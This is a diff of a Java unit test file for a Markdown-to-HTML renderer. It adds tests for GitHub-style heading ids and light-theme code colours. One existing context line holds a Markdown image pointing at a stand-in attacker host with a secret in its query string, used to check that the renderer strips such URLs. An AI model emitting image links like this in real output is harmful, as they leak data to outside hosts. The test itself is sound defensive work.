@@ -7,6 +7,23 @@ import static org.assertj.core.api.Assertions.assertThat;
 class MarkdownHtmlTest {
 
     @Test
+    void aHeadingHasTheIdGitHubGivesIt() {
+        assertThat(MarkdownHtml.render("## 3. Decisions")).contains("<h2 id=\"3-decisions\">3. Decisions</h2>");
+        assertThat(MarkdownHtml.render("# The `LocalImages` class")).contains("<h1 id=\"the-localimages-class\">");
+        assertThat(MarkdownHtml.render("### **Bold** _it_ [a link](x.md)")).contains("<h3 id=\"bold-it-a-link\">");
+        assertThat(MarkdownHtml.render("## Café & crème: what's left?")).as("letters of any language kept, each space a hyphen")
+                .contains("id=\"café--crème-whats-left\"");
+        assertThat(MarkdownHtml.render("## snake_case and kebab-case")).contains("id=\"snake_case-and-kebab-case\"");
+        assertThat(MarkdownHtml.render("Setext title\n============")).contains("<h1 id=\"setext-title\">");
+        assertThat(MarkdownHtml.render("## A\n\n## A\n\n## A-1\n\n## A")).as("a taken id counts on, as GitHub's")
+                .contains("id=\"a\"", "id=\"a-1\"", "id=\"a-1-1\"", "id=\"a-2\"");
+        assertThat(MarkdownHtml.render("## Notes", null, true, MarkdownHtml.Pictures.NONE)).as("every renderer, light or not")
+                .contains("id=\"notes\"");
+        assertThat(MarkdownHtml.render("## Notes")).as("ids count from the top of each document").contains("id=\"notes\"");
+        assertThat(MarkdownHtml.render("a paragraph")).doesNotContain("id=");
+    }
+
+    @Test
     void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
         String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
         assertThat(html).doesNotContain("<img").doesNotContain("attacker.example").contains("<i>status of x</i>");
@@ -24,6 +41,13 @@ class MarkdownHtmlTest {
                 .contains("<font color=\"#cf8e6d\">return</font>")
                 .contains("<font color=\"#6aab73\">\"&lt;b&gt;\"</font>")
                 .doesNotContain("<b>");
+    }
+
+    @Test
+    void aLightPageTakesTheLightThemesColours() {
+        assertThat(MarkdownHtml.render("```java\nreturn \"x\";\n```\n", null, true))
+                .contains("<font color=\"#0033b3\">return</font>")
+                .contains("<font color=\"#067d17\">\"x\"</font>");
     }
 
     @Test
